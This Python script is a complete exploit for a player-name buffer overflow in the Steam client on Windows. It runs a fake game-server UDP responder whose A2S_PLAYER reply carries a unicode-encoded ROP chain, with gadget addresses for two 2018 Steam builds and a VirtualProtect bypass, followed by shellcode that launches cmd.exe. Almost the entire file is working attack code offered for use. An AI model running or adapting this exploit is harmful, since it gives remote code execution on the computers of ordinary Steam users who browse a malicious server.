import logging
import socket
import textwrap


### Exploit for Server Info - Player Name buffer overflow (Steam.exe - Windows 8 and 10) #######
# More info: https://developer.valvesoftware.com/wiki/Server_queries
# Shellcode must contain valid unicode characters, pad with NOPs :)


STEAM_BASE = 0x01180000

# Shellcode: open cmd.exe
shellcode = "\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x01\xda\x90\x8b\x52\x78\x01\xda\x8b\x72\x20\x90\x01\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x90\x01\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x90\x01\xda\x31\xf6\x89\xd6\x31\xff\x89\xdf\x31\xc9\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd2\x83\xc4\x0c\x31\xc9\x68\x65\x73\x73\x42\x88\x4c\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x54\x57\x31\xff\x89\xc7\xff\xd6\x83\xc4\x0c\x31\xc9\x51\x68\x64\x6c\x6c\x41\x88\x4c\x24\x03\x68\x6c\x33\x32\x2e\x68\x73\x68\x65\x6c\x54\x31\xd2\x89\xfa\x89\xc7\xff\xd2\x83\xc4\x0b\x31\xc9\x68\x41\x42\x42\x42\x88\x4c\x24\x01\x68\x63\x75\x74\x65\x68\x6c\x45\x78\x65\x68\x53\x68\x65\x6c\x54\x50\xff\xd6\x83\xc4\x0d\x31\xc9\x68\x65\x78\x65\x41\x88\x4c\x24\x03\x68\x63\x6d\x64\x2e\x54\x59\x31\xd2\x42\x52\x31\xd2\x52\x52\x51\x52\x52\xff\xd0\xff\xd7"


def udp_server(host="0.0.0.0", port=27015):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print("[*] Starting TSQuery UDP server on host: %s and port: %s" % (host, port))
    s.bind((host, port))
    while True:
        (data, addr) = s.recvfrom(128*1024)
        requestType = checkRequestType(data)
        if requestType == "INFO":
            response = createINFOReply()
        elif requestType == "PLAYER":
            response = createPLAYERReply()
            print("[+] Payload sent!")
        else:
            response = 'nope'
        s.sendto(response,addr)
        yield data


def checkRequestType(data):
    # Header byte contains the type of request
    header = data[4]
    if header == "\x54":
        print("[*] Received A2S_INFO request")
        return "INFO"
    elif header == "\x55":
        print("[*] Received A2S_PLAYER request")
        return "PLAYER"
    else:
        print "Unknown request"
        return "UNKNOWN"


def createINFOReply():
    # A2S_INFO response
    # Retrieves information about the server including, but not limited to: its name, the map currently being played, and the number of players.
    pre = "\xFF\xFF\xFF\xFF"                         # Pre (4 bytes)
    header = "\x49"                                  # Header (1 byte)
    protocol = "\x02"                                # Protocol version (1 byte)
    name = "@Kernelpanic and [@0xacb](/0xacb) Server" + "\x00" # Server name (string)
    map_name = "de_dust2" + "\x00" # Map name (string)
    folder = "csgo" + "\x00" # Name of the folder contianing the game files (string)
    game = "Counter-Strike: Global Offensive" + "\x00" # Game name (string)
    ID = "\xda\x02" # Game ID (short)
    players = "\xFF" # Amount of players in the server (byte)
    maxplayers = "\xFF" # Max player allowed (byte)
    bots = "\x00" # Bots in game (byte)
    server_type = "d" # Server type, d = dedicate (byte)
    environment = "l" # Hosted on windows linux or mac, l is linux (byte)
    visibility = "\x00" # Password needed? (byte)
    VAC = "\x01" # VAC enabled? (byte)
    version = "1.3.6.7.1\x00"
    return pre + header + protocol + name + map_name + folder + game + ID + players + maxplayers + bots + server_type + environment + visibility + VAC + version


def to_unicode(addr):
    a = addr & 0xffff;
    b = addr >> 16;
    return eval('u"\\u%s\\u%s"' % (hex(a)[2:].zfill(4), hex(b)[2:].zfill(4)))


def convert_addr(gadget):
    return to_unicode(STEAM_BASE + gadget - 0x400000)


def convert_shellcode(code):
    code = code + "\x90"*8 #pad with nops
    output = ""
    l = textwrap.wrap(code.encode("hex"), 2)
    for i in range(0, len(l)-4, 4):
        output += "\\u%s%s\\u%s%s" % (l[i+1], l[i], l[i+3], l[i+2])
    return eval('u"%s"' % output)


def pwn():
    print("[*] Building ROP chain")

    # ROP gadgets for Steam.exe Nov 26 2018
    pop_eax = convert_addr(0x503ca7)
    pop_ecx = convert_addr(0x41bd9f)
    pop_edx = convert_addr(0x413a53)
    pop_ebx = convert_addr(0x40511c)
    pop_ebp = convert_addr(0x40247c)
    pop_esi = convert_addr(0x404de6)
    pop_edi = convert_addr(0x423839)
    jmp_esp = convert_addr(0x4413bd)
    pushad = convert_addr(0x425e00)
    ret_nop = convert_addr(0x401212)
    mov_edx_eax = convert_addr(0x5599a6)
    sub_eax_41e82c6a = convert_addr(0x51584f)
    mov_ebx_ecx_mov_ecx_eax_mov_eax_esi_pop_esi_ret = convert_addr(0x4e24eb)
    mov_esi_ptr_esi_mov_eax_esi_pop_esi = convert_addr(0x4506ea)
    xchg_eax_esi = convert_addr(0x543b86)

    writable_addr = convert_addr(0x69a01c)
    virtual_protect_idata = convert_addr(0x5f9280)
    new_protect = to_unicode(0x41e82c6a+0x40)
    msize = to_unicode(0x41e82c6a+0x501)

    '''
    # ROP gadgets for Steam.exe Beta Dec 14 2018
    pop_eax = convert_addr(0x425993)
    pop_ecx = convert_addr(0x41bd9f)
    pop_edx = convert_addr(0x413a53)
    pop_ebx = convert_addr(0x40511c)
    pop_ebp = convert_addr(0x40247c)
    pop_esi = convert_addr(0x404de6)
    pop_edi = convert_addr(0x423839)
    jmp_esp = convert_addr(0x4413bd)
    pushad = convert_addr(0x425e00)
    ret_nop = convert_addr(0x401212)
    mov_edx_eax = convert_addr(0x559d46)
    sub_eax_31e82c6a = convert_addr(0x515bbf)
    mov_ebx_ecx_mov_ecx_eax_mov_eax_esi_pop_esi_ret = convert_addr(0x4e284b)
    mov_esi_ptr_esi_mov_eax_esi_pop_esi = convert_addr(0x4506ea)
    xchg_eax_esi = convert_addr(0x515b5e)

    writable_addr = convert_addr(0x69a01c)
    virtual_protect_idata = convert_addr(0x5fa280)
    new_protect = to_unicode(0x31e82c6a+0x40)
    msize = to_unicode(0x31e82c6a+0x501)
    '''

    rop = pop_eax + msize + sub_eax_41e82c6a + mov_ebx_ecx_mov_ecx_eax_mov_eax_esi_pop_esi_ret \
              + u"\ub33f\ubeef" + mov_ebx_ecx_mov_ecx_eax_mov_eax_esi_pop_esi_ret + ret_nop*0x10 \
              + pop_ecx + writable_addr \
              + pop_eax + new_protect + sub_eax_41e82c6a + mov_edx_eax \
              + pop_ebp + jmp_esp + pop_esi + virtual_protect_idata \
              + mov_esi_ptr_esi_mov_eax_esi_pop_esi + u"\ub33f\ubeef" + xchg_eax_esi + pop_edi \
              + ret_nop + pop_eax + u"\u9090\u9090" + pushad

    #special conditions to avoid crashes
    special_condition_1 = to_unicode(STEAM_BASE + 0x10)
    special_condition_2 = to_unicode(STEAM_BASE + 0x11)
    payload = "A"*1024 + u"\ub33f\ubeef"*12 + special_condition_1 + special_condition_2*31 + rop + shellcode
    return payload.encode("utf-8") + "\x00"


def createPLAYERReply():
    # A2S_player response
    # This query retrieves information about the players currently on the server.
    pre = "\xFF\xFF\xFF\xFF"                        # Pre (4 bytes)
    header = "\x44"                                 # Header (1 byte)
    players = "\x01"                                # Amount of players (1 byte)
    indexPlayer1 = "\x01"                           # Index of player (1 byte)

    namePlayer2 = pwn()
    scorePlayer2 = ""
    durationPlayer2  = ""
    return pre + header + players + indexPlayer1 + namePlayer2 + scorePlayer2 + durationPlayer2


FORMAT_CONS = '%(asctime)s %(name)-12s %(levelname)8s\t%(message)s'
logging.basicConfig(level=logging.DEBUG, format=FORMAT_CONS)

if __name__ == "__main__":
    shellcode = convert_shellcode(shellcode)
    for data in udp_server():
        pass
